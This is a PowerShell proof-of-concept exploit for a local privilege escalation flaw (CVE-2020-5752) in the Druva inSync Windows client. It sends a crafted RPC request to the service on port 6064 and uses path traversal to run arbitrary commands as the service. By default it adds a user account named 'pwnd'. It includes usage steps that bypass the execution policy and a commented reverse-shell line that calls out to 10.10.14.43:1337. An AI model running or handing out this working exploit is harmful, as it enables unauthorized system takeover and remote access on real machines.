<#
    This PowerShell proof-of-concept demonstrates sending a crafted RPCW request
    to the Druva inSync service over TCP (port 6064). It executes an arbitrary
    command on the target system in the context of the service.

    source: https://github.com/yevh/CVE-2020-5752-Druva-inSync-Windows-Client-6.6.3---Local-Privilege-Escalation-PowerShell-/blob/main/DruvaPE.ps1
    
    Usage:
    1. Edit the `$cmd` variable to the command you want to run.
       Example:
           $cmd = "whoami > C:\Windows\Temp\out.txt"

    2. Save this script as `exploit.ps1` on the target system. 

    3. Run with PowerShell:
           powershell -ExecutionPolicy Bypass -File .\exploit.ps1

#>

code
$ErrorActionPreference = "Stop"

# Change this to the command you want executed by cmd.exe /c
$cmd = "net user pwnd /add" 

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

# Build payload
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

# Send payload
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

# verify effect with your own follow-up checks (not sent over the socket).
net user pwnd
# OR: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.43 -Port 1337
